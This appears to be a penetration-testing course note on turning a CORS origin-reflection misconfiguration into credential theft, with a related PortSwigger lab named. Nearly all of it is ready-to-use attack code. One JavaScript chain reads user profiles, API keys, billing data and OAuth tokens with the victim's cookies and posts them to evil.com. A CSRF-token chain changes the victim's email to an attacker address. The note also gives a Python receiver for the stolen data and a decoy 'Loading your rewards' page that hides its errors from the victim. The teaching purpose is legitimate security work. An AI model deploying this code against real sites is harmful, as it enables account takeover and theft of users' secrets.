---
tags: [vapt, cors, intermediate]
difficulty: intermediate
module: "12 - CORS"
topic: "12.09 CORS to Credential Theft"
portswigger_labs: ["CORS vulnerability with basic origin reflection"]
---

# 12.09 — CORS to Credential Theft

## What Can Be Stolen via CORS?

```
IF CORS MISCONFIG EXISTS (origin reflected + credentials allowed):

ATTACKER CAN READ:
  ✓ Session tokens (if stored in JSON responses)
  ✓ API keys
  ✓ OAuth access/refresh tokens
  ✓ Personal user data (email, address, phone)
  ✓ Payment information
  ✓ CSRF tokens (enabling CSRF attacks)
  ✓ Admin credentials
  ✓ Server-side secrets exposed in responses
  ✓ Internal system information

ATTACKER CANNOT READ (via CORS — needs XSS for these):
  ✗ HttpOnly cookies (not in JS-accessible space)
  ✗ Content from other browser tabs
  ✗ Local storage of other origins
```

---

## Complete Credential Theft Chain

```javascript
// ATTACK PAGE (hosted on evil.com):

async function stealCredentials() {
  const target = 'https://target.com';
  const exfil = 'https://evil.com/steal';
  
  // 1. STEAL USER PROFILE:
  const profile = await fetch(`${target}/api/v1/me`, {
    credentials: 'include'
  }).then(r => r.json());
  
  // 2. STEAL API KEYS:
  const apiKeys = await fetch(`${target}/api/v1/developer/keys`, {
    credentials: 'include'
  }).then(r => r.json());
  
  // 3. STEAL PAYMENT INFO:
  const payment = await fetch(`${target}/api/v1/billing`, {
    credentials: 'include'
  }).then(r => r.json());
  
  // 4. STEAL CONNECTED ACCOUNTS (OAuth tokens):
  const connected = await fetch(`${target}/api/v1/oauth/connected`, {
    credentials: 'include'
  }).then(r => r.json());
  
  // 5. EXFILTRATE EVERYTHING:
  await fetch(exfil, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ profile, apiKeys, payment, connected })
  });
}

stealCredentials();
```

---

## Stealing CSRF Token via CORS (Enabling CSRF Attack)

```javascript
// CORS MISCONFIG → STEAL CSRF TOKEN → PERFORM CSRF

async function csrfChain() {
  // 1. READ THE PAGE THAT CONTAINS CSRF TOKEN:
  const html = await fetch('https://target.com/account/settings', {
    credentials: 'include'
  }).then(r => r.text());
  
  // 2. EXTRACT CSRF TOKEN:
  const csrfMatch = html.match(/name="csrf[_-]?token"\s+value="([^"]+)"/i)
    || html.match(/meta[^>]+name="csrf-token"[^>]+content="([^"]+)"/i);
  
  if (!csrfMatch) {
    console.log('No CSRF token found');
    return;
  }
  const csrfToken = csrfMatch[1];
  
  // 3. USE CSRF TOKEN TO CHANGE EMAIL:
  const formData = new URLSearchParams();
  formData.append('new_email', 'attacker@evil.com');
  formData.append('csrf_token', csrfToken);
  
  const result = await fetch('https://target.com/account/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: formData.toString()
  });
  
  console.log('Email change result:', result.status);
  
  // 4. NOTIFY ATTACKER:
  fetch('https://evil.com/log?step=email_changed&csrf=' + csrfToken);
}
```

---

## Identifying High-Value Endpoints to Target

```bash
# RECONNAISSANCE — FIND SENSITIVE API ENDPOINTS:

# 1. Look in JS source files for API routes:
curl -s https://target.com/static/app.js | grep -oE '/api/v[0-9]+/[a-z/_-]+' | sort -u

# 2. Use waybackurls/gau to find historical endpoints:
echo "target.com" | gau | grep "/api/" | sort -u

# 3. Check API documentation (often public):
curl -s https://target.com/api/docs
curl -s https://target.com/swagger.json
curl -s https://target.com/openapi.json

# 4. Browse the app in Burp → HTTP History → filter for /api/ paths

# HIGH-VALUE ENDPOINT PATTERNS:
# /api/*/me              → user profile
# /api/*/account         → account details
# /api/*/keys            → API keys
# /api/*/tokens          → auth tokens
# /api/*/billing         → payment data
# /api/*/admin           → admin functions
# /api/*/settings        → app settings
```

---

## Setting Up a Receiver Server

```python
# PYTHON RECEIVER TO COLLECT STOLEN DATA:
from http.server import BaseHTTPRequestHandler, HTTPServer
import json, urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        
        print(f"\n[STOLEN DATA RECEIVED]")
        try:
            data = json.loads(body)
            print(json.dumps(data, indent=2))
        except:
            print(body)
        
        # CORS headers needed so evil.com's fetch to our server works:
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # suppress default logging

print("Receiver listening on port 8080...")
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
```

---

## Complete PoC Attack Page

```html
<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
</head>
<body>
<script>
const TARGET = 'https://target.com';
const RECEIVER = 'https://evil.com:8080/steal';  // your receiver server

(async () => {
  try {
    // Steal multiple endpoints concurrently:
    const [profile, keys, settings] = await Promise.allSettled([
      fetch(`${TARGET}/api/me`, {credentials: 'include'}).then(r => r.json()),
      fetch(`${TARGET}/api/developer/keys`, {credentials: 'include'}).then(r => r.json()),
      fetch(`${TARGET}/api/settings`, {credentials: 'include'}).then(r => r.json()),
    ]);
    
    // Send to receiver:
    await fetch(RECEIVER, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        profile: profile.status === 'fulfilled' ? profile.value : null,
        keys: keys.status === 'fulfilled' ? keys.value : null,
        settings: settings.status === 'fulfilled' ? settings.value : null,
        timestamp: new Date().toISOString()
      })
    });
  } catch(e) {
    // Silent fail — victim doesn't see errors
    new Image().src = `${RECEIVER}/err?msg=${encodeURIComponent(e.message)}`;
  }
})();
</script>
<!-- Visible content to distract victim: -->
<p>Loading your rewards...</p>
</body>
</html>
```

---

## Related Notes
- [[04 - Origin Reflection Misconfiguration]] — the vulnerability being exploited
- [[05 - Null Origin Misconfiguration]] — null origin attack
- [[07 - Subdomain Trust]] — subdomain-based exploitation
- [[10 - CORS to Account Takeover Chain]] — escalating to ATO
- [[12 - Defense Strict Origin Whitelisting]] — defense
